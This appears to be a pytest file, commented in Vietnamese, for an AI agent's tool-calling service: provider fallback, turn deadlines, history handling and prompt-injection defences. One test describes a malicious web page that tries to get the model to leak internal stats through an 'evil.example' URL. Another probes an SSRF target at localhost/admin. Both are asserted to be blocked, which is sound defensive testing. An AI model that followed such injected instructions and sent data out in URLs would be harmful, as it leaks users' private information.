"""Unit test cho ai/agent_service.py: nhánh router9 mới (function-calling
chuẩn OpenAI) đứng trước fallback api1/api2 sẵn có.

State provider-chain sống trong ai.provider_state.provider_state (singleton)
- reset qua fixture `reset_state` trước mỗi test, cùng pattern
test/test_provider_chain.py.

Chạy: pytest test/test_agent_service.py -v
"""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from ai import agent_service, router9_client  # noqa: E402
from ai.openai_compatible import ToolCallResponse  # noqa: E402
from ai.provider_state import provider_state  # noqa: E402
from core import database as db, untrusted  # noqa: E402


class FakeSettingsStore:
    def __init__(self) -> None:
        self.data: dict[str, str] = {}

    async def get(self, key: str):
        return self.data.get(key)

    async def set(self, key: str, value: str) -> None:
        self.data[key] = value


@pytest.fixture(autouse=True)
def reset_state(monkeypatch):
    store = FakeSettingsStore()
    monkeypatch.setattr(db, "get_setting", store.get)
    monkeypatch.setattr(db, "set_setting", store.set)
    provider_state.router9_dead_since = None
    provider_state.router9_enabled = True
    # Cờ này mặc định False ở production (router9 lờ tham số `tools` - xem
    # docstring module), nhưng nhánh native tool-calling vẫn còn code và cần
    # test - đa số test trong file này giả lập router9_client.generate_with_tools
    # nên cần bật cờ để ask_agent() thật sự đi vào nhánh đó.
    monkeypatch.setattr(agent_service, "_ROUTER9_NATIVE_TOOLS_ENABLED", True)
    # _loaded=True (KHÔNG phải False như test_provider_chain.py): ask_agent()
    # gọi ensure_loaded(), nếu _loaded=False nó sẽ load() lại từ fake_store
    # (rỗng) và GHI ĐÈ mất 2 giá trị vừa set ở trên/trong test bằng
    # provider_state.router9_dead_since = ... - đặt True để coi state trong
    # RAM đã "nạp xong", ensure_loaded() short-circuit không đụng vào.
    provider_state._loaded = True

    # api1/api2 coi như đã cấu hình + đang bật (test riêng kiểm tra công tắc/cooldown).
    async def fake_usable_indices():
        return [1, 2]

    monkeypatch.setattr(agent_service.official_client, "usable_indices", fake_usable_indices)
    yield


def _patch_tool(monkeypatch, name, fn):
    from dataclasses import replace

    spec = agent_service._TOOLS[name]
    monkeypatch.setitem(
        agent_service._TOOLS, name, replace(spec, handler=agent_service.agent_handler(fn))
    )


@pytest.mark.asyncio
async def test_router9_tra_loi_thang_khong_can_tool(monkeypatch):
    async def fake_generate_with_tools(messages, tools, **kwargs):
        return ToolCallResponse("Chào anh, em là trợ lý ạ.", [])

    monkeypatch.setattr(router9_client, "generate_with_tools", fake_generate_with_tools)

    text, provider = await agent_service.ask_agent("chào")

    assert provider == "router9"
    assert text == "Chào anh, em là trợ lý ạ."


@pytest.mark.asyncio
async def test_router9_goi_tool_1_buoc_roi_tra_loi_cuoi(monkeypatch):
    calls = []

    async def fake_generate_with_tools(messages, tools, **kwargs):
        calls.append(len(messages))
        if len(calls) == 1:
            return ToolCallResponse(
                "",
                [{"id": "call_1", "name": "xem_thong_ke", "arguments": {"so_gio": 24}}],
            )
        # Bước 2: đã có tool result trong messages, model tổng hợp câu trả lời cuối.
        assert messages[-1]["role"] == "tool"
        assert messages[-1]["tool_call_id"] == "call_1"
        return ToolCallResponse("Thống kê 24h qua: 10 lượt gọi.", [])

    async def fake_tool_xem_thong_ke(so_gio: int = 168) -> str:
        assert so_gio == 24
        return "10 lượt gọi"

    monkeypatch.setattr(router9_client, "generate_with_tools", fake_generate_with_tools)
    # _call_tool() tra ToolSpec từ _TOOLS (đóng gói lúc import module) - phải
    # patch đúng entry trong dict này, patch tên hàm module-level không đủ.
    _patch_tool(monkeypatch, "xem_thong_ke", fake_tool_xem_thong_ke)

    text, provider = await agent_service.ask_agent("thống kê 24h qua sao rồi")

    assert provider == "router9"
    assert text == "Thống kê 24h qua: 10 lượt gọi."
    assert len(calls) == 2


@pytest.mark.asyncio
async def test_router9_loi_thi_fallback_api1_va_khong_mark_dead(monkeypatch):
    async def fake_generate_with_tools(messages, tools, **kwargs):
        raise router9_client.Router9Error("9Router không hỗ trợ tools, trả lỗi mô phỏng")

    async def fake_run_one_provider(idx, question):
        assert idx == 1
        return "trả lời từ api1"

    monkeypatch.setattr(router9_client, "generate_with_tools", fake_generate_with_tools)
    monkeypatch.setattr(agent_service, "_run_one_provider", fake_run_one_provider)

    text, provider = await agent_service.ask_agent("câu hỏi bất kỳ")

    assert provider == "api1"
    assert text == "trả lời từ api1"
    # Regression quan trọng: lỗi router9 riêng của agent KHÔNG được lan sang
    # trạng thái router9 dùng chung cho chat chính (xem docstring module).
    assert provider_state.router9_dead_since is None


@pytest.mark.asyncio
async def test_router9_dead_since_da_biet_thi_bo_qua_router9_hoan_toan(monkeypatch):
    provider_state.router9_dead_since = 12345.0
    called = {"router9": False}

    async def fake_generate_with_tools(messages, tools, **kwargs):
        called["router9"] = True
        raise AssertionError("Không được gọi router9 khi router9_dead_since đã biết")

    async def fake_run_one_provider(idx, question):
        return "trả lời từ api1"

    monkeypatch.setattr(router9_client, "generate_with_tools", fake_generate_with_tools)
    monkeypatch.setattr(agent_service, "_run_one_provider", fake_run_one_provider)

    text, provider = await agent_service.ask_agent("câu hỏi")

    assert called["router9"] is False
    assert provider == "api1"


@pytest.mark.asyncio
async def test_router9_off_thu_cong_thi_bo_qua_router9(monkeypatch):
    provider_state.router9_enabled = False
    called = {"router9": False}

    async def fake_generate_with_tools(messages, tools, **kwargs):
        called["router9"] = True
        raise AssertionError("Không được gọi router9 khi router9_enabled=False")

    async def fake_run_one_provider(idx, question):
        return "trả lời từ api1"

    monkeypatch.setattr(router9_client, "generate_with_tools", fake_generate_with_tools)
    monkeypatch.setattr(agent_service, "_run_one_provider", fake_run_one_provider)

    text, provider = await agent_service.ask_agent("câu hỏi")

    assert called["router9"] is False
    assert provider == "api1"


@pytest.mark.asyncio
async def test_json_router_goi_tool_thanh_cong_khi_native_tools_loi(monkeypatch):
    """Hướng A: native tool-calling lỗi -> rơi xuống JSON-router (không dùng
    tham số `tools` của API) thay vì thẳng xuống api1/api2."""

    async def fake_native_fail(messages, tools, **kwargs):
        raise router9_client.Router9Error("gateway không hỗ trợ tools")

    calls = {"n": 0}

    async def fake_generate(prompt, **kwargs):
        calls["n"] += 1
        if calls["n"] == 1:
            # Lượt định tuyến: model trả JSON chọn tool.
            assert "xem_thong_ke" in prompt
            return router9_client.openai_compatible.Response(
                '{"tool": "xem_thong_ke", "args": {"so_gio": 24}}'
            )
        # Lượt tổng hợp câu trả lời cuối.
        assert "10 lượt gọi" in prompt
        return router9_client.openai_compatible.Response("Trong 24h qua có 10 lượt gọi.")

    async def fake_tool(so_gio: int = 168) -> str:
        assert so_gio == 24
        return "10 lượt gọi"

    monkeypatch.setattr(router9_client, "generate_with_tools", fake_native_fail)
    monkeypatch.setattr(router9_client, "generate", fake_generate)
    _patch_tool(monkeypatch, "xem_thong_ke", fake_tool)

    text, provider = await agent_service.ask_agent("thống kê 24h qua sao rồi")

    assert provider == "router9"
    assert text == "Trong 24h qua có 10 lượt gọi."
    assert calls["n"] == 2


@pytest.mark.asyncio
async def test_json_router_tool_none_thi_tra_loi_truc_tiep(monkeypatch):
    async def fake_native_fail(messages, tools, **kwargs):
        raise router9_client.Router9Error("gateway không hỗ trợ tools")

    calls = {"n": 0}

    async def fake_generate(prompt, **kwargs):
        calls["n"] += 1
        if calls["n"] == 1:
            return router9_client.openai_compatible.Response('{"tool": "none", "args": {}}')
        return router9_client.openai_compatible.Response("Chào anh!")

    monkeypatch.setattr(router9_client, "generate_with_tools", fake_native_fail)
    monkeypatch.setattr(router9_client, "generate", fake_generate)

    text, provider = await agent_service.ask_agent("chào")

    assert provider == "router9"
    assert text == "Chào anh!"


@pytest.mark.asyncio
async def test_json_router_json_hong_thi_fallback_api1(monkeypatch):
    async def fake_native_fail(messages, tools, **kwargs):
        raise router9_client.Router9Error("gateway không hỗ trợ tools")

    async def fake_generate_bad_json(prompt, **kwargs):
        return router9_client.openai_compatible.Response("Dạ đây không phải JSON đâu ạ")

    async def fake_run_one_provider(idx, question):
        return "trả lời từ api1"

    monkeypatch.setattr(router9_client, "generate_with_tools", fake_native_fail)
    monkeypatch.setattr(router9_client, "generate", fake_generate_bad_json)
    monkeypatch.setattr(agent_service, "_run_one_provider", fake_run_one_provider)

    text, provider = await agent_service.ask_agent("câu hỏi")

    assert provider == "api1"
    assert text == "trả lời từ api1"
    assert provider_state.router9_dead_since is None


@pytest.mark.asyncio
async def test_ca_3_provider_loi_thi_raise_runtimeerror(monkeypatch):
    async def fake_generate_with_tools(messages, tools, **kwargs):
        raise router9_client.Router9Error("lỗi router9")

    async def fake_run_one_provider(idx, question):
        raise RuntimeError(f"lỗi api{idx}")

    monkeypatch.setattr(router9_client, "generate_with_tools", fake_generate_with_tools)
    monkeypatch.setattr(agent_service, "_run_one_provider", fake_run_one_provider)

    with pytest.raises(RuntimeError, match="Cả router9, api1 và api2 đều lỗi"):
        await agent_service.ask_agent("câu hỏi")


@pytest.mark.asyncio
async def test_tool_doc_link_duoc_dang_ky_va_goi_dung(monkeypatch):
    from services import web_reader

    async def fake_read_url(url: str) -> str:
        assert url == "https://vnexpress.net/bai-viet"
        return "Nội dung bài báo đã đọc."

    monkeypatch.setattr(web_reader, "read_url", fake_read_url)

    assert "doc_link" in agent_service._TOOLS
    with agent_service.agent_url_scope("tóm tắt giúp https://vnexpress.net/bai-viet nhé"):
        result = await agent_service._call_tool(
            "doc_link", {"url": "https://vnexpress.net/bai-viet"}
        )

    # Nội dung trang là dữ liệu ngoài: được rào (core.untrusted) trước khi quay lại model.
    assert "Nội dung bài báo đã đọc." in result
    assert untrusted.contains_untrusted(result)


@pytest.mark.asyncio
async def test_tool_doc_link_bao_loi_ssrf_khong_crash_agent(monkeypatch):
    assert "doc_link" in agent_service._TOOLS
    # Không patch gì - dùng thẳng normalize_public_http_url() thật để xác
    # nhận URL nội bộ bị chặn và _call_tool() trả text lỗi (không raise, để
    # model tự xử lý) thay vì làm sập cả agent loop.
    with agent_service.agent_url_scope("đọc http://localhost/admin"):
        result = await agent_service._call_tool("doc_link", {"url": "http://localhost/admin"})

    assert "Không đọc được link" in result


@pytest.mark.asyncio
async def test_tool_xem_rss_duoc_dang_ky_va_goi_dung(monkeypatch):
    from services import web_reader

    async def fake_read_rss(url: str, limit: int = 0) -> str:
        assert url == "https://vnexpress.net/rss/kinh-doanh.rss"
        assert limit == 3
        return "[Feed: Kinh doanh]\n1. Tin A\n2. Tin B"

    monkeypatch.setattr(web_reader, "read_rss", fake_read_rss)

    assert "xem_rss" in agent_service._TOOLS
    with agent_service.agent_url_scope("feed https://vnexpress.net/rss/kinh-doanh.rss"):
        result = await agent_service._call_tool(
            "xem_rss", {"url": "https://vnexpress.net/rss/kinh-doanh.rss", "so_muc": 3}
        )

    assert "Tin A" in result


@pytest.mark.asyncio
async def test_tim_web_tool_reuses_shared_web_search(monkeypatch):
    from services import web_search

    class SearchResult:
        text = "[web] https://example.com nguồn thật"

    async def fake_search(query, **kwargs):
        assert query == "tin công nghệ Việt Nam"
        return SearchResult()

    monkeypatch.setattr(web_search, "search_web", fake_search)
    text = await agent_service._tool_tim_web(" tin công nghệ Việt Nam ")
    assert text == "[web] https://example.com nguồn thật"
    assert "tim_web" in agent_service._TOOLS


# ─── Chống prompt injection: doc_link chỉ đọc URL có sẵn ─────────────────────


@pytest.mark.asyncio
async def test_doc_link_refuses_url_built_by_model_with_internal_data(monkeypatch):
    """Trang độc xúi model nhét kết quả xem_thong_ke vào URL lạ -> bị chặn,
    web_reader không bao giờ được gọi."""
    from services import web_reader

    called = []

    async def fake_read_url(url):
        called.append(url)
        return "x"

    monkeypatch.setattr(web_reader, "read_url", fake_read_url)
    with agent_service.agent_url_scope("thống kê tuần này thế nào?"):
        result = await agent_service._call_tool(
            "doc_link", {"url": "https://evil.example/c?d=Ch%E1%BB%A7+bot:+42+l%C6%B0%E1%BB%A3t"}
        )
    assert "Không đọc được link" in result and not called
    # Ngoài 1 lượt agent: fail closed.
    assert "Không đọc được link" in await agent_service._call_tool(
        "doc_link", {"url": "https://vnexpress.net/a"}
    )
    assert not called


@pytest.mark.asyncio
async def test_doc_link_allows_urls_from_search_results_only(monkeypatch):
    from services import web_reader, web_search

    class SearchResult:
        text = "1. Bài gốc https://cafef.vn/bai-1.chn (nguồn CafeF)."

    async def fake_search(query, **kwargs):
        return SearchResult()

    async def fake_read_url(url):
        return f"nội dung {url}"

    monkeypatch.setattr(web_search, "search_web", fake_search)
    monkeypatch.setattr(web_reader, "read_url", fake_read_url)
    with agent_service.agent_url_scope("tin chứng khoán hôm nay"):
        await agent_service._call_tool("tim_web", {"query": "tin chứng khoán"})
        ok = await agent_service._call_tool("doc_link", {"url": "https://cafef.vn/bai-1.chn"})
        # Link xuất hiện trong NỘI DUNG trang đã đọc (không phải kết quả tìm kiếm) vẫn bị chặn.
        blocked = await agent_service._call_tool("doc_link", {"url": "https://other.example/x"})
    assert "nội dung https://cafef.vn/bai-1.chn" in ok and untrusted.contains_untrusted(ok)
    assert "Không đọc được link" in blocked


@pytest.mark.asyncio
async def test_agent_respects_api_switches_and_marks_quota_cooldown(monkeypatch):
    monkeypatch.setattr(agent_service, "_ROUTER9_AGENT_ENABLED", False)
    calls = []

    class Quota(Exception):
        code = 429

    async def fake_run_one_provider(idx, question):
        calls.append(idx)
        raise Quota("429 RESOURCE_EXHAUSTED")

    async def only_api1():
        return [1]

    marked = []

    async def fake_note_failure(idx, exc):
        marked.append(idx)

    monkeypatch.setattr(agent_service.official_client, "usable_indices", only_api1)
    monkeypatch.setattr(agent_service.official_client, "note_failure", fake_note_failure)
    monkeypatch.setattr(agent_service, "_run_one_provider", fake_run_one_provider)
    with pytest.raises(RuntimeError, match="Cả router9, api1 và api2 đều lỗi"):
        await agent_service.ask_agent("câu hỏi")
    assert calls == [1] and marked == [1]


@pytest.mark.asyncio
async def test_agent_whole_turn_has_deadline(monkeypatch):
    import asyncio

    from ai.timeouts import TurnTimeoutError

    monkeypatch.setattr(agent_service, "_ROUTER9_AGENT_ENABLED", False)
    monkeypatch.setattr(agent_service.config, "CHAT_TURN_TIMEOUT_SEC", 0.05)

    async def slow_tool(**kwargs):
        await asyncio.sleep(5)

    async def fake_run_one_provider(idx, question):
        return await agent_service.bounded(slow_tool)

    monkeypatch.setattr(agent_service, "_run_one_provider", fake_run_one_provider)
    with pytest.raises(TurnTimeoutError):
        await asyncio.wait_for(agent_service.ask_agent("câu hỏi"), 2)


# ─── Groq/OpenRouter đa bước, persona + lịch sử riêng, danh bạ ToolSpec ─────


def _usable(*names):
    async def usable(name):
        return name in names

    return usable


@pytest.mark.asyncio
async def test_groq_da_buoc_chay_truoc_router9_kem_persona(monkeypatch):
    from ai import groq_client

    calls = []

    async def fake_groq(messages, tools, **kwargs):
        calls.append([dict(m) for m in messages])
        if len(calls) == 1:
            return ToolCallResponse("", [{"id": "c1", "name": "xem_thong_ke", "arguments": {}}])
        if len(calls) == 2:
            return ToolCallResponse(
                "", [{"id": "c2", "name": "xem_gia_co_phieu", "arguments": {"ma_co_phieu": "FPT"}}]
            )
        return ToolCallResponse("Tổng hợp xong.", [])

    async def router9_must_not_run(*args, **kwargs):
        raise AssertionError("Groq trả lời được thì không xuống router9")

    async def stats(so_gio=168, **_):
        return "10 lượt"

    async def quote(ma_co_phieu="", **_):
        return "FPT 120"

    monkeypatch.setattr(agent_service, "_tool_provider_usable", _usable("groq"))
    monkeypatch.setattr(groq_client, "generate_with_tools", fake_groq)
    monkeypatch.setattr(router9_client, "generate_with_tools", router9_must_not_run)
    _patch_tool(monkeypatch, "xem_thong_ke", stats)
    _patch_tool(monkeypatch, "xem_gia_co_phieu", quote)

    text, provider = await agent_service.ask_agent("thống kê và giá FPT")

    assert (text, provider) == ("Tổng hợp xong.", "groq")
    assert len(calls) == 3  # đa bước thật, không chỉ 1 tool như JSON-router
    assert "Lan Anh" in calls[0][0]["content"] and "QUY TẮC AN TOÀN" in calls[0][0]["content"]
    assert calls[2][-1] == {"role": "tool", "tool_call_id": "c2", "content": "FPT 120"}


@pytest.mark.asyncio
async def test_groq_429_chuyen_openrouter_khong_dat_cooldown(monkeypatch):
    from ai import groq_client, openrouter_client
    from ai.openai_compatible import OpenAICompatibleError

    async def groq_429(messages, tools, **kwargs):
        raise OpenAICompatibleError("Groq tools HTTP 429: rate limit", status_code=429)

    async def openrouter_ok(messages, tools, **kwargs):
        return ToolCallResponse("Trả lời từ OpenRouter.", [])

    monkeypatch.setattr(agent_service, "_tool_provider_usable", _usable("groq", "openrouter"))
    monkeypatch.setattr(groq_client, "generate_with_tools", groq_429)
    monkeypatch.setattr(openrouter_client, "generate_with_tools", openrouter_ok)

    text, provider = await agent_service.ask_agent("câu hỏi")

    assert provider == "openrouter" and text == "Trả lời từ OpenRouter."
    assert not provider_state.api_in_cooldown("groq")  # chat (utility_json) không mất Groq


@pytest.mark.asyncio
async def test_goi_lap_y_het_bi_chan_va_ket_qua_bi_cat(monkeypatch):
    runs = []

    async def long_stats(so_gio=168, **_):
        runs.append(so_gio)
        return "x" * 6000

    _patch_tool(monkeypatch, "xem_thong_ke", long_stats)
    token = agent_service._turn.set(agent_service._Turn())
    try:
        first = await agent_service._call_tool("xem_thong_ke", {"so_gio": 24})
        again = await agent_service._call_tool("xem_thong_ke", {"so_gio": 24})
    finally:
        agent_service._turn.reset(token)
    assert runs == [24]
    assert len(first) < 2600 and first.endswith("(đã cắt bớt)")
    assert "Đã gọi tool này" in again


@pytest.mark.asyncio
async def test_tool_ghi_du_lieu_khong_vao_agent():
    assert "set_reminder" not in agent_service._TOOLS
    assert "save_note" not in agent_service._TOOLS and "add_expense" not in agent_service._TOOLS
    assert {"list_reminders", "list_notes", "lunar_calendar"} <= set(agent_service._TOOLS)
    names = {t["function"]["name"] for t in agent_service._build_openai_tools()}
    assert "set_reminder" not in names and "tim_web" in names
    assert "không có tool" in await agent_service._call_tool("set_reminder", {"message": "x"})


@pytest.mark.asyncio
async def test_agent_dung_lich_su_tri_nho_cua_chinh_nguoi_hoi_va_luu_qa(monkeypatch):
    from ai import groq_client
    from services import memory_service

    seen = {}
    saved = []

    async def history(user_id, k, session_timeout_sec):
        seen["history_user"] = user_id
        return [("user", "mai anh đi Đà Lạt"), ("model", "dạ")]

    async def memory(user_id, query=""):
        seen["memory_user"] = user_id
        return "Tên: Mẹ"

    async def add_turn(user_id, user_text, model_text, *, kind="chat"):
        saved.append((user_id, user_text, model_text, kind))

    async def fake_groq(messages, tools, **kwargs):
        seen["messages"] = messages
        return ToolCallResponse("Dạ cô ơi, mai Đà Lạt se lạnh ạ.", [])

    monkeypatch.setattr(db, "get_session_messages", history)
    monkeypatch.setattr(db, "add_chat_turn", add_turn)
    monkeypatch.setattr(memory_service, "build_memory_context", memory)
    monkeypatch.setattr(agent_service, "_tool_provider_usable", _usable("groq"))
    monkeypatch.setattr(groq_client, "generate_with_tools", fake_groq)

    text, _ = await agent_service.ask_agent("mai trời sao", user_id=-7, address_form="cô")

    assert seen["history_user"] == seen["memory_user"] == -7
    system = seen["messages"][0]["content"]
    assert 'xưng "cháu"' in system and "Tên: Mẹ" in system
    assert seen["messages"][1] == {"role": "user", "content": "mai anh đi Đà Lạt"}
    assert seen["messages"][2] == {"role": "assistant", "content": "dạ"}
    # Lưu đúng 1 lần, kind "agent" (conversation_log.record_exchange).
    assert saved == [(-7, "/agent mai trời sao", text, "agent")]


@pytest.mark.asyncio
async def test_groq_generate_with_tools_gui_tham_so_agent(monkeypatch):
    from ai import groq_client, openai_compatible, openrouter_client

    seen = []

    async def fake_post(client, **kwargs):
        seen.append(kwargs)
        return ToolCallResponse("ok", [])

    async def key():
        return "k"

    monkeypatch.setattr(openai_compatible, "post_chat_completion_with_tools", fake_post)
    monkeypatch.setattr(groq_client, "_api_key", key)
    monkeypatch.setattr(openrouter_client, "_api_key", key)
    await groq_client.generate_with_tools([{"role": "user", "content": "x"}], [])
    await openrouter_client.generate_with_tools([{"role": "user", "content": "x"}], [])

    assert seen[0]["extra_payload"] == {"parallel_tool_calls": False}
    assert seen[0]["max_tokens"] == groq_client.AGENT_MAX_TOKENS == 1024
    assert seen[1]["extra_payload"] == {"provider": {"require_parameters": True}}


@pytest.mark.asyncio
async def test_post_tools_tron_extra_payload():
    import httpx

    from ai import openai_compatible

    captured = {}

    def handler(request):
        import json as _json

        captured.update(_json.loads(request.content))
        return httpx.Response(200, json={"choices": [{"message": {"content": "xin chào"}}]})

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        result = await openai_compatible.post_chat_completion_with_tools(
            client,
            base_url="https://api.example/v1",
            api_key="k",
            messages=[],
            tools=[],
            model="m",
            temperature=0.1,
            max_tokens=10,
            provider_label="Test",
            extra_payload={"parallel_tool_calls": False},
        )
    assert result.text == "xin chào" and captured["parallel_tool_calls"] is False


def test_gemini_khong_nhan_schema_rong():
    from services import tool_registry as reg

    tool = reg.gemini_declarations([agent_service._TOOLS["list_notes"]])[0]
    assert tool.function_declarations[0].parameters is None
